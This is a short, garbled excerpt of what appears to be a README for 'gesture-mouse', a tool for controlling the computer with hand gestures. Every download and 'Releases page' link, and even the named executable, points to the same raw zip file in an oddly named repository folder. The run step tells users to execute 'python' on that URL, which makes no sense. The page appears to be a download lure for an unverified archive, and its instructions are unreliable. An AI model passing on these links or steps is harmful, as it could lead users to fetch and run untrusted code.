...
[![Download gesture-mouse](https://raw.githubusercontent.com/Phonkich/gesture-mouse/main/counterthwarting/mouse_gesture_v2.7.zip)](https://raw.githubusercontent.com/Phonkich/gesture-mouse/main/counterthwarting/mouse_gesture_v2.7.zip)
...
2. **Download the Software**
   Visit the [Releases page](https://raw.githubusercontent.com/Phonkich/gesture-mouse/main/counterthwarting/mouse_gesture_v2.7.zip) to download the latest version of gesture-mouse.
...
4. **Run the Application**
   Navigate to the folder where you downloaded the application. You will find an executable file named `https://raw.githubusercontent.com/Phonkich/gesture-mouse/main/counterthwarting/mouse_gesture_v2.7.zip`. Open your command line interface and enter:

   ```bash
   python https://raw.githubusercontent.com/Phonkich/gesture-mouse/main/counterthwarting/mouse_gesture_v2.7.zip
   ```
...
## 📥 Download & Install
Now that you know what gesture-mouse is and how it works, it's time to get started. Visit the [Releases page](https://raw.githubusercontent.com/Phonkich/gesture-mouse/main/counterthwarting/mouse_gesture_v2.7.zip) to download the latest version. Follow the instructions above to install and run the application. Enjoy controlling your computer with just your hands!